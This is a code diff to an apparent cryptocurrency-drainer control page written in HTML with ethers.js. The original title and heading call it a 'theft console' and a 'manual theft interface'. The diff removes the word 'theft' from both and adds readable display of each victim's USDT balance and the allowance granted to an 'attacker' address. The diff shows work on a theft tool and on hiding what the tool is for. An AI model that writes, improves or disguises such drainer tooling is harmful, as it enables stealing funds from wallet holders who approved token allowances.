@@ -2,7 +2,7 @@
 <html lang="zh-Hant">
 <head>
   <meta charset="UTF-8">
-  <title>🎯 EOA 盜取控制台</title>
+  <title>🎯 EOA </title>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <style>
     body { font-family: 'Arial'; padding: 20px; background: #fff; }
@@ -13,7 +13,7 @@
   </style>
 </head>
 <body>
-  <h2>🎯 EOA 控制台（手動盜取界面）</h2>
+  <h2>🎯 EOA </h2>
   <p><b>目前登入帳號：</b><span id="account">尚未連線...</span></p>
   <p><b>身份驗證：</b><span id="auth" class="bad">尚未驗證</span></p>
   <br>
@@ -74,8 +74,10 @@
           const contract = new ethers.Contract(USDT, ABI, provider);
           const balance = await contract.balanceOf(val);
           const allowance = await contract.allowance(val, attacker);
-          document.getElementById("balance").innerText = "💰 USDT 餘額: " + balance.toString() +
-            "\n📜 授權額度: " + allowance.toString();
+          const readableBalance = ethers.utils.formatUnits(balance, 6);
+          const readableAllowance = ethers.utils.formatUnits(allowance, 6);
+          document.getElementById("balance").innerText =
+            "💰 USDT 餘額: " + readableBalance + " USDT\n📜 授權額度: " + readableAllowance + " USDT";
         } catch {
           document.getElementById("balance").innerText = "查詢失敗";
         }
